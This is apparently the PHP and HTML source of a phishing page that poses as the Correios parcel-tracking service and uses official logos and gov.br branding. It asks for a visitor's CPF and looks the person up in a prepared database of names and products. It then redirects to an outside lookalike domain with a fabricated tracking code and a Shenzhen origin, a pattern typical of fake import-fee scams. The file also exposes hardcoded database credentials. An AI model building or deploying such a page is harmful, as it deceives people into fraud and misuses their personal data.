<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rastreamento de Encomendas dos Correios</title>
    <link rel="icon" type="image/x-icon" href="images/favi-ect.png">
    <link rel="manifest" href="/manifest.json">
    <meta name="theme-color" content="#317EFB">
    <meta property="og:description" content="Está esperando uma encomenda? Link &amp; Track é a solução para rastrear suas encomendas! Rastreie ou gere links para seus clientes ou destinatários!">
    <meta property="og:image" content="images/trackfb.jpg">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding-bottom: 140px; /* Ajuste conforme a altura do rodapé */
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
        }
        .center-align {
            text-align: center;
        }
        .rastreamento {
            padding: 20px;
        }
        .correios-img {
            max-width: 200px;
            height: auto;
        }
        .formcpf {
            margin-bottom: 20px;
        }
        form {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 20px;
        }
        input[type="text"] {
            padding: 10px;
            width: 100%;
            max-width: 300px;
            margin-bottom: 10px;
        }
        .custom-button {
            padding: 10px 20px;
            background-color: #317EFB;
            color: white;
            border: none;
            cursor: pointer;
            font-family: Arial, sans-serif; /* Ajusta a fonte do botão */
        }
        .custom-button:hover {
            background-color: #1a5fb6;
        }
        .banner {
            position: relative;
            width: 100%;
            height: auto;
            overflow: hidden;
        }
        .banner img {
            width: 100%;
            height: auto;
            display: block;
        }
        .banner-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            color: white;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.5);
            border-radius: 10px;
        }
        .banner-content h1 {
            font-size: 2em;
            margin: 0;
        }
        .banner-content p {
            font-size: 1.2em;
            margin: 10px 0 0;
        }
        #rodape {
            background-color: #ffe600;
            text-align: left;
            position: relative;
            bottom: 0;
            width: 100%;
            padding: 0px 0; /* Ajustado para 15px em cima e em baixo */
            box-sizing: border-box;
            max-width: 100%;
            z-index: 1000;
        }
        .recipiente {
            max-width: 1000px; /* Reduzido o máximo para 1000px */
            margin: 0 auto;
            display: flex;
            flex-wrap: wrap; /* Adicionado para que os elementos se ajustem */
            justify-content: space-around; /* Ajusta o espaçamento entre os itens */
        }
        .rodape-links {
            flex: 1 1 250px; /* Reduzido o tamanho flexível dos itens */
            padding: 10px; /* Reduzido o padding para menor espaço ocupado */
        }
        .rodape-links h2 {
            color: #00416b;
            font-size: 18px; /* Reduzido o tamanho da fonte */
            font-weight: 700;
            margin-bottom: 0px; /* Ajuste no espaçamento inferior */
        }
        .lista-icone {
            list-style-type: none;
            padding: 0;
        }
        .lista-icone li {
            margin-bottom: 6px; /* Reduzido o espaçamento entre os itens da lista */
        }
        .lista-icone a {
            text-decoration: none;
            color: #00416b;
            display: flex;
            align-items: center;
        }
        .lista-icone .material-icons {
            font-size: 20px; /* Reduzido o tamanho dos ícones */
            margin-right: 8px; /* Reduzido o espaçamento entre ícone e texto */
        }
        .marca-gov {
            background-image: url('https://www.gov.br/planalto/pt-br/assuntos/logos-logomarcas-e-simbolos/logo-govbr-colorida-01.jpg/view');
            background-size: contain;
            background-repeat: no-repeat;
            height: 40px; /* Reduzido o tamanho da marca do governo */
            margin-top: 2px; /* Ajustado o espaçamento superior */
        }
        .copyright {
            text-align: center;
            font-size: 12px; /* Reduzido o tamanho da fonte */
            margin-top: 10px; /* Ajustado o espaçamento superior */
        }
    </style>
</head>
<body>
    <div class="rastreamento center-align">
        <div class="consulta">
            <img class="correios-img" src="images/correios.png" alt="Logo dos Correios">
            <h2 class="bold">Rastreamento</h2>
        </div>
        <div class="formcpf">
            <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="post">
                <h4>Deseja acompanhar seu objeto?<br>Digite seu CPF/CNPJ ou código* de rastreamento.</h4>
                <div>
                    <label for="cpf">CPF:</label><br>
                    <input type="text" id="cpf" name="cpf" value="<?php echo isset($_POST['cpf']) ? htmlspecialchars($_POST['cpf']) : ''; ?>" maxlength="14" onblur="formata_cpf_cnpj(this)" onkeypress="return somenteNumeros(event)">
                </div>
                <div>
                    <button type="submit" class="custom-button"><span>Consultar</span></button>
                </div>
            </form>
        </div>
        <div class="container">
            <div style="background: #f0f0f0">
            <?php
            if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['cpf'])) {
                // Função para formatar o CPF
                function formatar_cpf($cpf) {
                    $cpf = preg_replace('/\D/', '', $cpf);
                    return preg_replace("/(\d{3})(\d{3})(\d{3})(\d{2})/", "$1.$2.$3-$4", $cpf);
                }

                // Função para conectar ao banco de dados e buscar dados pelo CPF
                function consulta_cpf_buscar_dados($cpf) {
                    $host = 'localhost';
                    $db = 'borogodo_consulta';
                    $user = 'borogodo_consulta';
                    $pass = 'Cr1st@+.';

                    $conn = new mysqli($host, $user, $pass, $db);

                    if ($conn->connect_error) {
                        die("Falha na conexão: " . $conn->connect_error);
                    }

                    $stmt = $conn->prepare("SELECT * FROM mytable WHERE CPF = ?");
                    if ($stmt === false) {
                        die("Erro na preparação da consulta: " . $conn->error);
                    }

                    $stmt->bind_param("s", $cpf);
                    $stmt->execute();
                    $result = $stmt->get_result();

                    if ($result->num_rows > 0) {
                        $dados = $result->fetch_assoc();
                    } else {
                        $dados = null;
                    }

                    $stmt->close();
                    $conn->close();

                    return $dados;
                }

                // Busca os dados do CPF fornecido
                $cpf = formatar_cpf($_POST['cpf']);
                $dados = consulta_cpf_buscar_dados($_POST['cpf']);

                if ($dados) {
                    // Constrói a URL com os parâmetros
                    $url = 'https://correiosfacil.org/importacao/importa-facil/rastreio/?';
                    $url .= 'codigo=' . rawurlencode('AR874052069BR');
                    $url .= '&local=' . rawurlencode('China - Shenzen');
                    $url .= '&denvio=' . rawurlencode('04/06/2024');
                    $url .= '&henvio=' . rawurlencode('08:26:23');
                    $url .= '&nomecliente=' . rawurlencode($dados['NOME']);
                    $url .= '&nomeprod=' . rawurlencode($dados['PRODUTO']);
                    $url .= '&cpf=' . rawurlencode($dados['CPF']);

                    // Redireciona para a URL com os parâmetros
                    echo "<script>window.location.href='$url';</script>";
                    exit;
                } else {
                    echo '<p>Nenhum registro encontrado para o CPF informado.</p>';
                }
            }
            ?>
              </div>
          </div>
      </div>
   </div>
 </div>
</div>
</div>
<section class="banner">
  <img src="https://i.imgur.com/jMn7uDI.png">
    <footer id="rodape">
    <div class="recipiente largura-maxima">
        <div class="rodape-links">
            <h2>Fale Conosco</h2>
            <ul class="lista-icone">
                <li>
                    <a href="#">
                        <i class="material-icons">feedback</i>
                        <span>Registro de Manifestações</span>
                    </a>
                </li>
                <li>
                    <a href="#">
                        <i class="material-icons">help_outline</i>
                        <span>Central de Atendimento</span>
                    </a>
                </li>
                <li>
                    <a href="#">
                        <i class="material-icons">business</i>
                        <span>Soluções para o seu negócio</span>
                    </a>
                </li>
                <li>
                    <a href="#">
                        <i class="material-icons">headset_mic</i>
                        <span>Suporte ao cliente com contrato</span>
                    </a>
                </li>
                <li>
                    <a href="#">
                        <i class="material-icons">hearing</i>
                        <span>Ouvidoria</span>
                    </a>
                </li>
                <li>
                    <a href="#">
                        <i class="material-icons">report</i>
                        <span>Denúncia</span>
                    </a>
                </li>
            </ul>
        </div>

        <div class="rodape-links">
            <h2>Sobre os Correios</h2>
            <ul class="lista-icone">
                <li>
                    <a href="#">
                        <i class="material-icons">business</i>
                        <span>Identidade corporativa</span>
                    </a>
                </li>
                <li>
                    <a href="#">
                        <i class="material-icons">school</i>
                        <span>Educação e cultura</span>
                    </a>
                </li>
                <li>
                    <a href="#">
                        <i class="material-icons">verified_user</i>
                        <span>Código de ética</span>
                    </a>
                </li>
                <li>
                    <a href="#">
                        <i class="material-icons">privacy_tip</i>
                        <span>Política de Privacidade e Notas Legais</span>
                    </a>
                </li>
            </ul>
        </div>

       <div class="rodape-links">
            <h2>Outros Sites</h2>
            <ul class="lista-icone">
                <li>
                    <a href="#">
                        <i class="material-icons">store</i>
                        <span>Loja online dos Correios</span>
                    </a>
                </li>
            </ul>
        </div>
    </div>
    <div class="marca-gov">
    </div>
    <p></p>
    <div class="copyright">© Copyright 2024</div>
            <p></p>
        </footer>
    </div>
   </div>
   <!-- Estilos CSS -->
   <style>
    #rodape {
        background-color: #ffe600; /* Adiciona fundo amarelo */
        text-align: left; /* Alinha o texto à esquerda */
    }

    .rodape-links h2 {
        color: #00416b; /* Cor do texto dos títulos */
    }

    .lista-icone .material-icons {
        color: #00416b; /* Cor dos ícones */
    }

    .lista-icone span {
        color: #00416b; /* Cor do texto dos itens */
    }
    .recipiente.largura-maxima {
    padding: 13px;
}
.copyright {
    margin: 10px 10px;
    padding: 20px 0;
}
.rodape-links h2 {
    color: #00416b;
    font-size: 26px;
    font-weight: 700;
}
</style>

    <!-- Scripts -->
    <script src="js/imask.min.js"></script>
    <script>
        // Função para formatar CPF/CNPJ dinamicamente
        function formata_cpf_cnpj(campo) {
            var valor = campo.value.replace(/\D/g, '');

            if (valor.length <= 11) { // CPF
                valor = valor.replace(/(\d{3})(\d)/, '$1.$2');
                valor = valor.replace(/(\d{3})(\d)/, '$1.$2');
                valor = valor.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            } else { // CNPJ
                valor = valor.replace(/^(\d{2})(\d)/, '$1.$2');
                valor = valor.replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3');
                valor = valor.replace(/\.(\d{3})(\d)/, '.$1/$2');
                valor = valor.replace(/(\d{4})(\d)/, '$1-$2');
            }

            campo.value = valor;
        }

        // Função para permitir apenas números no campo
        function somenteNumeros(e) {
            var charCode = e.charCode ? e.charCode : e.keyCode;
            if (charCode != 8 && charCode != 9) {
                if (charCode < 48 || charCode > 57) {
                    return false;
                }
            }
            return true;
        }
    </script>
</body>
</html>